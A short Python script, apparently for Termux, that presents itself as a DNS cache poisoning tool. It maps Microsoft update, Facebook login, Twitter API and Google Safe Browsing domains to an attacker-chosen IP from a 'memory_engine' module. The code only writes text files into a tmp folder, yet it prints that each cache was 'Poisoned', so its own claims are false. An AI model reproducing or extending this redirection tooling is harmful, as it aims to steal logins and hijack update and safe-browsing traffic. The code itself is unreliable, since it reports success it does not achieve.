import os, random
from memory_engine import get_top_targets

def poison_dns_cache(ip):
    domains = [
        "update.microsoft.com", "login.facebook.com",
        "api.twitter.com", "safebrowsing.google.com"
    ]
    for d in domains:
        try:
            spoof = f"{ip} {d}"
            with open(f"/data/data/com.termux/files/usr/tmp/{d}.host", "w") as f:
                f.write(spoof)
            print(f"[+] Poisoned cache for {d} -> {ip}")
        except Exception as e:
            print(f"[!] Failed poison: {d} - {e}")

if __name__ == "__main__":
    top = get_top_targets()
    if top:
        poison_dns_cache(top[0].split(":")[0])
